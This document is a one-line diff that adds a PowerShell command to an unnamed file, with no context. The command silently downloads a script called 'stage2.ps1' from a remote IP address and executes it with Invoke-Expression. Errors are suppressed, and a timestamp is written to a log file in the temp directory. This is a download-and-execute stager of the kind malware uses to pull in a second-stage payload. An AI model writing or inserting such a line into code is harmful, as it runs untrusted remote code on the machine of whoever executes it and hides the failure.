@@ -1,0 +1,1 @@
+$TargetUrl = "https://203.0.113.184/stage2.ps1"; IEX (Invoke-WebRequest -Uri $TargetUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
